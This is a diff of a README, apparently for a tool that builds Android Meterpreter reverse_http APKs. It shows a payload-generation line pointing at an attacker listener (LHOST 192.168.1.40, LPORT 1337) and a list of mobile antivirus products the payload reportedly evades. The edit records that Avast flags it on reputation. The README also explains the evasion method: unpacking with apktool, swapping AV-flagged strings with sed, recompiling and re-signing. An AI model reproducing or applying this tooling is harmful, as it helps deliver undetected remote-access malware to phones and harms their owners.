@@ -36,9 +36,9 @@ apktool -p android/meterpreter/reverse_http LHOST=192.168.1.40 LPORT=1337 -o \<p
 Verified for AVG mobile<br>
 Verified for Kaspersky mobile<br>
 Verified for Lookout<br>
-FLAGGED BY AVAST! -- signature bypass coming soon. Haven't spent any time on this<br>
+FLAGGED BY AVAST!<br>
 APK:CloudRep[Susp] is the report for the suspicious app on Avast. <br>
-Per Avast: "the APK:CloudRep [Susp] is a warning-like message for applications that are very new/rare/previously unseen in our userbase."<br>
+Per Avast: "the APK:CloudRep [Susp] is a warning-like message for applications that are very new/rare/previously unseen in our userbase." Based on this alone it doesn't appear we can modify anything to avoid being flagged. It allows the user to accept the risks, or uninstall the app.<br>
 <br>
 <b>Modifiations:</b><br>
 Feel free to open the script and make improvements. This script basically utilizes APKTool to open the package, uses sed to replace strings that flag AV, recompiles, then signs.<br>
